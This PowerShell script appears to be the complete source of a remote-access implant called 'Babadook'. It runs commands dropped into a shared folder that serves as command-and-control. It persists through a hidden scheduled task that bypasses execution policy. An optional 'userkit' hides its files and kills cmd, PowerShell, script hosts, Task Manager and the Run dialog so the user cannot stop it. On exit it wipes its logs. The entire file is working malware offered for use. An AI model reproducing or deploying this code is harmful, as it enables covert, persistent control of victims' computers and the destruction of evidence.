############################
## Babadook Configuration ##
############################

# Paths
$SharePath = "Y:\Path\To\Shared\Folder" # Shared Folder used for C&C
$CmdPath = "$($SharePath)\command.ps1" # Global Command Script

$Interval = 10 # Interval between checking the C&C file

# Persistence, UserKit and Clean-up
$Persist = $false # Make Babadook persist on reboots
$UserKit = $false # Hide Babadook from user
$Cleanup = $true # Clear Babadook log and cmd file on exit

# UserKit options
$UserKitOptions = [hashtable]::Synchronized(@{})

$UserKitOptions.KillPS = $true # Kill powershell and powershell_ise
$UserKitOptions.HideMe = $false # Kill hide Babadook files (mark as hidden then disable showing hidden files)
$UserKitOptions.KillCmd = $true # Kill cmd.exe
$UserKitOptions.KillTaskManager = $false # Kill taskmanager
$UserKitOptions.KillScripting = $true # Kill wscript and cscript
$UserKitOptions.KillRun = $true # Auto-close task-scheduler and run dialogs

$BabadookMutexName = "BabadookMTX"

###################
## Internal Vars ##
###################

$Global:Running = $true
$ScriptPath = $script:MyInvocation.MyCommand.Path
$ScriptName = Split-Path -Leaf $ScriptPath
[System.Threading.Mutex] $BabadookMutex
$Global:BabadookWatchdog = $null
$Global:WatchdogJob = $null
$Global:WatchdogRunspace = $null

$MyPID = $([System.Diagnostics.Process]::GetCurrentProcess()).Id

$LogPath = "$($SharePath)\babadook.$($env:COMPUTERNAME).$($MyPID).log"
$CurrMachineCmdPath = "$($SharePath)\cmd.$($env:COMPUTERNAME).$($MyPID).ps1"
    
####################
## Util functions ##
####################

function Log ($msg) { "$(Get-Date -f "dd/MM/yyyy HH:mm:ss") [$($MyPID)] [info] $($msg)" | Out-Default }

function Install-Task ($BBDPath) {
    $CommandArguments = "-executionpolicy bypass -windowstyle hidden -f `"$($BBDPath)`""
    $taskRunAsuser = [Environment]::UserDomainName +"\" + $env:USERNAME

    $service = new-object -com("Schedule.Service")
    $service.Connect()
    $rootFolder = $service.GetFolder("\")

    Try {

        $rootFolder.GetTask("\Babadook") | Out-Null
        Log "Babadook persist task already installed"
        
    } Catch {
	
		Log "Copying Babadook to local machine at `"$($BBDPath)`""
		Copy-Item $script:MyInvocation.MyCommand.Path $BBDPath -Force
        Log "Installing Babadook persist task"

        $taskDefinition = $service.NewTask(0)

        $regInfo = $taskDefinition.RegistrationInfo
        $regInfo.Description = 'Ba-ba-ba DOOK DOOK DOOK'
        $regInfo.Author = $taskRunAsuser

        $settings = $taskDefinition.Settings
        $settings.Enabled = $True
        $settings.StartWhenAvailable = $True
        $settings.Hidden = $True

        $triggers = $taskDefinition.Triggers

        # Triger time
        $triggerDaily = $triggers.Create(2)
        $triggerDaily.StartBoundary = "$(Get-Date -Format 'yyyy-MM-dd')T08:00:00"
        $triggerDaily.DaysInterval = 1
        $triggerDaily.Enabled = $True

        # Trigger logon
        $triggerLogon = $triggers.Create(9)
        $triggerLogon.UserId = $taskRunAsUser
        $triggerLogon.Enabled = $True
        
        # Trigger session lock
        $triggerLogon = $triggers.Create(11)
        $triggerLogon.UserId = $taskRunAsUser
        $triggerLogon.Enabled = $True        
        $triggerLogon.StateChange = 7 # Screen Lock state

        # Trigger Idle
        $triggerIdle = $triggers.Create(6)
        $triggerIdle.Enabled = $True

        $Action = $taskDefinition.Actions.Create(0)
        $Action.Path = 'powershell.exe'
        $Action.Arguments = $CommandArguments

        $rootFolder.RegisterTaskDefinition( 'Babadook', $taskDefinition, 6, $null , $null, 3) | Out-Null
        
    }# end :: try/catch
}# End :: Install-Task

########################
## Babadook functions ##
########################

function Babadook-Persist
{
	$CharSet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray()
	$NewName = $(Get-Random -InputObject $CharSet -Count 8 | % -Begin { $randStr = $null } -Process { $randStr += [char]$_ } -End { $randStr }) + ".ps1"
	$NewPath = "$($env:LOCALAPPDATA)\$($NewName)"
    
    Install-Task $NewPath
    
}# end :: Babadook-Persist

$Global:WatchdogCode = {

    Try {

        Add-Type  @" 
            using System;
            using System.Runtime.InteropServices; 
            using System.Text;
         
            public class APIFuncs
            {
             [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern int GetWindowText(IntPtr hwnd,StringBuilder lpString, int cch);
             [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
            public static extern IntPtr GetForegroundWindow();
             [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
                public static extern Int32 GetWindowThreadProcessId(IntPtr hWnd,out Int32 lpdwProcessId);
             [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
                public static extern Int32 GetWindowTextLength(IntPtr hWnd);
             [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
                public static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);
                    
                public const int WM_SYSCOMMAND = 0x0112;
                public const int SC_CLOSE = 0xF060;                
             }
"@
		
    	Function Hide-Me {
    		If (Test-Path $ScriptPath) { $(Get-Item $ScriptPath -Force).Attributes = "Archive,Hidden" }
    		If (Test-Path $CurrMachineCmdPath) { $(Get-Item $CurrMachineCmdPath -Force).Attributes = "Archive,Hidden" }
    		If (Test-Path $LogPath) { $(Get-Item $LogPath -Force).Attributes = "Archive,Hidden" }
    		If (Test-Path $CmdPath) { $(Get-Item $CmdPath -Force).Attributes = "Archive,Hidden" }
    		Set-ItemProperty HKCU:\\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced -Name Hidden -Value 2 # Don't display hidden files
    	}# end :: Hide-Me
        
        Function Kill-Run {
            $ForegroundWindow = [apifuncs]::GetForegroundWindow()
            $WindowTextLen = [apifuncs]::GetWindowTextLength($ForegroundWindow)
            $StringBuffer = New-Object text.stringbuilder -ArgumentList ($WindowTextLen + 1)
            $ReturnLen = [apifuncs]::GetWindowText($ForegroundWindow,$StringBuffer,$StringBuffer.Capacity)
            $WindowText = $StringBuffer.tostring()
            if ($WindowText -eq "Run" -Or $WindowText.Contains("Properties") -Or $WindowText.Contains("Task Scheduler")) {
                [void][apifuncs]::SendMessage($ForegroundWindow, [apifuncs]::WM_SYSCOMMAND, [apifuncs]::SC_CLOSE, 0)
            }# end :: if
        }# end :: Kill-Run
    	
    	Function Kill-PS {
    		Stop-Process -processname powershell_ise -Force -ErrorAction SilentlyContinue # Kill powershell_ise.Exe
    		# Kill powershell processes which are not me
    		$AllPS = [array] $(Get-Process | Where-Object { $_.ProcessName -eq "powershell" -And $_.Id -ne "$($Options.MyPID)" })
    		If ($AllPS.Count -gt 0) {
    			ForEach ($Proc in $AllPS) { Stop-Process -Id $Proc.ID -Force -ErrorAction SilentlyContinue }# end :: foreach
    		}# end :: if	
    	}# end :: Kill-PS
		
		Function Kill-Scripting {
			Stop-Process -processname wscript -Force -ErrorAction SilentlyContinue
			Stop-Process -processname cscript -Force -ErrorAction SilentlyContinue
		}# end :: Kill-Scripting

        while ($Options.Running) {
            Try {
    			If ($Options.HideMe) { Hide-Me }
                If ($Options.KillTaskManager) { Stop-Process -processname taskmgr -Force -ErrorAction SilentlyContinue } # Kill TaskManager
                If ($Options.KillCmd) { Stop-Process -processname cmd -Force -ErrorAction SilentlyContinue } # Kill Cmd.Exe
    			If ($Options.KillPS) { Kill-PS }
				If ($Options.KillScripting) { Kill-Scripting }
    			If ($Options.KillRun) { Kill-Run }
            }
            Catch [system.exception] {
                Log "Watchdog Error: $_"
            }# end :: Try/Catch
        }# end :: while
        
        Log "Watchdog off-line"
    } Catch [system.exception] {
        Log "Error on Watchdog: $_"
    }# end :: Try/Catch
    
}# end :: $WatchdogCode

function Babadook-Userkit {

	$UserKitOptions.MyPID = $MyPID
	$UserKitOptions.Running = $true

    # Create RunSpace to share $Options variable between both 'threads'
	$Global:WatchdogRunspace = [RunspaceFactory]::CreateRunspace()
	$Global:WatchdogRunspace.Open()
	$Global:WatchdogRunspace.SessionStateProxy.SetVariable('Options',$UserKitOptions)

    # "If it's in a word or in a look, you can't get rid of the babadook"
    $Global:BabadookWatchdog = [PowerShell]::Create()
	$Global:BabadookWatchdog.Runspace = $Global:WatchdogRunspace
	$Global:BabadookWatchdog.AddScript($Global:WatchdogCode) | Out-Null
    $Global:WatchdogJob = $Global:BabadookWatchdog.BeginInvoke()
    Log "Watchdog started"

}# end :: Babadook-Userkit

function Babadook-Terminate {
    $Global:Running = $false
	$UserKitOptions.Running = $false
}# end :: Babadook-Terminate

###############
## Main Code ##
###############

Start-Transcript -Path $LogPath -Force -Append -ErrorAction SilentlyContinue | Out-Null 
Log "Attached to $($env:COMPUTERNAME) with pid $($MyPID)"

# Wait for mutex
[bool]$MutexWasCreated = $false
$BabadookMutex = New-Object System.Threading.Mutex($true, $BabadookMutexName, [ref] $MutexWasCreated)
if (!$MutexWasCreated) { 
    Log "Babadook Mutex found, waiting release..."
    $BabadookMutex.WaitOne() | Out-Null
    Log "Babadook Mutex acquired"
} else {
    Log "Babadook Mutex installed"
}# end :: if

# Persistence
If ($Persist) { Babadook-Persist }

# User-land Kit (kinda lame rootkit without root)
If ($UserKit) { Babadook-Userkit }

# Command parsing loop
While ($Global:Running) {
       
    # Global commands
    If (Test-Path $CmdPath) {
		Log "Triggering process loop for global cmd file"
        Try {
            & $CmdPath
        } Catch [system.exception] {
            Log "Error running script: $_"
        }# end :: try/catch
    }# end :: if
    
    # Machine-Specific commands
    If (Test-Path $CurrMachineCmdPath) {
		Log "Triggering process loop for machine cmd file"
        Try {
            & $CurrMachineCmdPath
            Clear-Content $CurrMachineCmdPath
        } Catch [system.exception] {
            Log "Error running script: $_"
        }# end :: try/catch
    }# end :: if

    Start-Sleep $Interval
}#end :: while

Log "Shutting down Babadook"

# Stop Watchdog
If ($Global:BabadookWatchdog -And $Global:WatchdogJob) {
    Log "Stopping Babadook Watchdog"
	# No EndInvoke because we don't care about the return anyway
	$Global:WatchdogRunspace.Close()
    $Global:BabadookWatchdog.Dispose() | Out-Null
    Log "Watchdog disposed"
}# end :: if

# Release Mutex
Log "Releasing Babadook Mutex"
$BabadookMutex.ReleaseMutex(); 
$BabadookMutex.Close();

Stop-Transcript -ErrorAction SilentlyContinue | Out-Null

# Clear logs
If ($Cleanup) {
	Remove-Item $LogPath
	If (Test-Path $CurrMachineCmdPath) { Remove-Item $CurrMachineCmdPath }
}# end :: if